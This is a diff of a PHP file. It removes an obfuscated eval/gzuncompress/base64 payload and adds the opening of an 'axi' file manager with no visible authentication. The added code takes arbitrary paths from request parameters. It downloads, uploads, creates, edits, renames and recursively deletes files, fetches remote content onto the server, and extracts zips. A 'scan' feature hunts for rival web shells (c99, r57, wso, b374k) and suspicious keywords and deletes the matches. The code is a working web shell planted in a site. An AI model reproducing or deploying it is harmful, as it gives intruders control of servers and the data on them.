@@ -1,3 +1,772 @@
 <?php
-$x = "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";
-eval("?>" . gzuncompress(base64_decode($x)));
+// ======================================================
+// FILE MANAGER START
+// ======================================================
+
+$uploadStatus  = null;
+$folderStatus  = null;
+$fileStatus    = null;
+$comadStatus   = null;
+$zipStatus     = null;
+$extractStatus = null;
+$scanStatus    = null;
+$scanResults   = [];
+
+$path = $_GET['path'] ?? '.';
+$real = realpath($path);
+if (!$real || !is_dir($real)) { $path = '.'; $real = realpath('.'); }
+
+
+
+/* =====================================================
+   FIX DOWNLOAD BESAR (Streaming tanpa batas)
+   ===================================================== */
+if (isset($_GET['download'])) {
+    $file = $_GET['download'];
+    $full = realpath($path . "/" . $file);
+
+    if ($full && is_file($full)) {
+        ignore_user_abort(true);
+        set_time_limit(0);
+
+        header("Content-Description: File Transfer");
+        header("Content-Type: application/octet-stream");
+        header("Content-Disposition: attachment; filename=\"".basename($full)."\"");
+        header("Content-Length: " . filesize($full));
+
+        $chunk = 1024 * 1024;
+        $fh = fopen($full, "rb");
+        while (!feof($fh)) {
+            echo fread($fh, $chunk);
+            flush();
+        }
+        fclose($fh);
+        exit;
+    } else {
+        echo "Download error";
+        exit;
+    }
+}
+
+
+
+/* DELETE RECURSIVE */
+function axi_delete($target){
+    if (is_file($target) || is_link($target)) return @unlink($target);
+    if (is_dir($target)){
+        foreach(scandir($target) as $i){
+            if($i=='.'||$i=='..') continue;
+            axi_delete($target.'/'.$i);
+        }
+        return @rmdir($target);
+    }
+    return false;
+}
+
+
+/* Upload */
+if (isset($_POST['upload']) && isset($_FILES['file']['name'])) {
+    $ok=true;
+    foreach ($_FILES['file']['name'] as $k=>$n){
+        if ($_FILES['file']['error'][$k]==0){
+            if(!move_uploaded_file($_FILES['file']['tmp_name'][$k], "$path/$n"))
+                $ok=false;
+        } else $ok=false;
+    }
+    $uploadStatus = $ok ? "success" : "error";
+}
+
+
+/* Delete single */
+if (isset($_GET['delete'])){
+    axi_delete("$path/".$_GET['delete']);
+}
+
+
+/* Delete selected */
+if (isset($_POST['delete_selected']) && isset($_POST['selected'])){
+    foreach($_POST['selected'] as $x){
+        axi_delete("$path/$x");
+    }
+}
+
+
+/* Create folder */
+if (isset($_POST['newfolder']) && $_POST['foldername']!==""){
+    $folderStatus = mkdir("$path/".$_POST['foldername']) ? "success" : "error";
+}
+
+
+/* Create file (NEW — with content) */
+if (isset($_POST['createfile_confirm'])) {
+    $newfile = trim($_POST['newfilename']);
+    $content = $_POST['newfilecontent'];
+    if ($newfile !== "") {
+        file_put_contents("$path/$newfile", $content);
+    }
+}
+
+
+/* COMAD */
+if (isset($_POST['comad']) && !empty($_POST['fileurl']) && !empty($_POST['saveas'])){
+    $url  = trim($_POST['fileurl']);
+    $save = basename(trim($_POST['saveas']));
+    $d = @file_get_contents($url);
+    $comadStatus = ($d!==false && file_put_contents("$path/$save",$d)!==false) ? "success":"error";
+}
+
+
+/* Rename */
+if (isset($_POST['renamefile'])){
+    @rename("$path/".$_POST['oldname'], "$path/".$_POST['newname']);
+}
+
+
+/* SAVE EDIT */
+$saveStatus=null;
+if (isset($_POST['savefile'])){
+    $saveStatus = (@file_put_contents($_POST['filepath'], $_POST['content'])!==false)
+                    ? "success" : "error";
+}
+
+
+/* ZIP SELECTED */
+if (isset($_POST['zip_selected']) && isset($_POST['selected'])){
+    if(class_exists('ZipArchive')){
+        $zipName = trim($_POST['zip_name']);
+        if($zipName=='') $zipName = "selected-".date("Ymd-His").".zip";
+        if(!preg_match('/\.zip$/i',$zipName)) $zipName.='.zip';
+
+        $zipPath = "$path/$zipName";
+        $zip = new ZipArchive();
+
+        if($zip->open($zipPath, ZipArchive::CREATE|ZipArchive::OVERWRITE)){
+            foreach($_POST['selected'] as $item){
+                $full = "$path/$item";
+                if(is_file($full)){
+                    $zip->addFile($full, $item);
+                } else if(is_dir($full)){
+                    $it = new RecursiveIteratorIterator(
+                        new RecursiveDirectoryIterator($full, FilesystemIterator::SKIP_DOTS),
+                        RecursiveIteratorIterator::SELF_FIRST
+                    );
+                    foreach($it as $f){
+                        $local = substr($f->getPathname(), strlen($path)+1);
+                        $f->isDir() ? $zip->addEmptyDir($local) : $zip->addFile($f->getPathname(), $local);
+                    }
+                }
+            }
+            $zip->close();
+            $zipStatus="success";
+        } else $zipStatus="error";
+
+    } else $zipStatus="nozip";
+}
+
+
+/* EXTRACT ZIP */
+if(isset($_GET['extract'])){
+    $zipFile = "$path/".$_GET['extract'];
+    if(is_file($zipFile) && class_exists('ZipArchive')){
+        $zip = new ZipArchive();
+        if($zip->open($zipFile)===true){
+            $zip->extractTo($path);
+            $zip->close();
+            $extractStatus="success";
+        } else $extractStatus="error";
+    } else $extractStatus="error";
+}
+
+
+/* =====================================================
+   SCAN FILE SENSITIF (FITUR BARU)
+   ===================================================== */
+if (isset($_POST['scan_files'])) {
+    // Pola nama file yang mencurigakan
+    $suspiciousPatterns = [
+        '/shell\.php$/i',
+        '/c99\.php$/i',
+        '/r57\.php$/i',
+        '/wso\.php$/i',
+        '/b374k\.php$/i',
+        '/backdoor/i',
+        '/webadmin/i',
+        '/adminer/i',
+        '/filemanager/i',
+        '/elfinder/i',
+        '/cmd\.php$/i',
+        '/symlink\.php$/i',
+        '/cgi\.php$/i',
+        '/\.phps?$/i',
+        '/\.phtml$/i',
+        '/\.phar$/i',
+        '/\.inc$/i',
+        '/axi/i',
+        '/upload/i',
+        '/admin/i',
+        '/config/i'
+    ];
+
+    // Kata kunci dalam konten file
+    $dangerousKeywords = [
+        'eval(',
+        'base64_decode(',
+        'shell_exec(',
+        'system(',
+        'passthru(',
+        'exec(',
+        'popen(',
+        'proc_open(',
+        'assert(',
+        'create_function(',
+        '$_REQUEST[',
+        '$_GET[',
+        '$_POST[',
+        'phpinfo()',
+        'set_time_limit(0)',
+        'ignore_user_abort(1)',
+        'gzinflate(',
+        'str_rot13('
+    ];
+
+    function scanDirectory($dir, &$results, $patterns, $keywords) {
+        if (!is_dir($dir)) return;
+
+        $items = @scandir($dir);
+        if (!$items) return;
+
+        foreach ($items as $item) {
+            if ($item == '.' || $item == '..') continue;
+
+            $fullPath = $dir . '/' . $item;
+            $relativePath = str_replace(realpath('.') . '/', '', realpath($fullPath));
+
+            if (!$relativePath) {
+                $relativePath = $fullPath;
+            }
+
+            // Skip jika file terlalu besar
+            if (is_file($fullPath) && filesize($fullPath) > 10485760) { // 10MB
+                continue;
+            }
+
+            // Scan untuk nama mencurigakan
+            $suspiciousName = false;
+            $matchedPattern = '';
+            foreach ($patterns as $pattern) {
+                if (preg_match($pattern, $item)) {
+                    $suspiciousName = true;
+                    $matchedPattern = $pattern;
+                    break;
+                }
+            }
+
+            // Scan konten file
+            $suspiciousContent = false;
+            $foundKeywords = [];
+            if (is_file($fullPath) && is_readable($fullPath)) {
+                $ext = strtolower(pathinfo($fullPath, PATHINFO_EXTENSION));
+                $textExtensions = ['php', 'phtml', 'html', 'htm', 'js', 'txt', 'inc', 'conf', 'config', 'sql', 'log'];
+
+                if (in_array($ext, $textExtensions)) {
+                    $content = @file_get_contents($fullPath);
+                    if ($content !== false) {
+                        foreach ($keywords as $keyword) {
+                            if (stripos($content, $keyword) !== false) {
+                                $suspiciousContent = true;
+                                $foundKeywords[] = $keyword;
+                            }
+                        }
+                    }
+                }
+            }
+
+            // Jika mencurigakan, tambahkan ke hasil
+            if ($suspiciousName || $suspiciousContent) {
+                $fileSize = is_file($fullPath) ? round(filesize($fullPath)/1024, 2) . ' KB' : '-';
+
+                $results[] = [
+                    'name' => $item,
+                    'path' => $relativePath,
+                    'full_path' => $fullPath,
+                    'type' => is_dir($fullPath) ? 'Directory' : 'File',
+                    'size' => $fileSize,
+                    'modified' => @date("Y-m-d H:i:s", filemtime($fullPath)),
+                    'name_suspicious' => $suspiciousName,
+                    'matched_pattern' => $matchedPattern,
+                    'content_suspicious' => $suspiciousContent,
+                    'found_keywords' => $foundKeywords,
+                    'risk_level' => ($suspiciousName && $suspiciousContent) ? 'HIGH' :
+                                   ($suspiciousName ? 'MEDIUM' : 'LOW')
+                ];
+            }
+
+            // Scan subdirectory secara rekursif (batasi kedalaman)
+            if (is_dir($fullPath) && count(explode('/', $relativePath)) < 10) {
+                scanDirectory($fullPath, $results, $patterns, $keywords);
+            }
+        }
+    }
+
+    // Mulai scanning
+    $startTime = microtime(true);
+    scanDirectory('.', $scanResults, $suspiciousPatterns, $dangerousKeywords);
+    $scanTime = round(microtime(true) - $startTime, 2);
+
+    $scanStatus = count($scanResults) > 0 ? "found" : "clean";
+}
+
+
+/* Hapus file hasil scan */
+if (isset($_POST['delete_scan_result']) && isset($_POST['scan_file_path'])) {
+    $fileToDelete = $_POST['scan_file_path'];
+    if (file_exists($fileToDelete)) {
+        if (@unlink($fileToDelete)) {
+            $scanStatus = "deleted";
+            // Refresh halaman setelah 2 detik
+            echo '<meta http-equiv="refresh" content="2;url='.$_SERVER['PHP_SELF'].'">';
+        } else {
+            $scanStatus = "delete_error";
+        }
+    }
+}
+
+
+$logo_url="https://ik.imagekit.io/axi/axi1.png";
+
+function makeBreadcrumb($p){
+    $c=trim($p,"/");
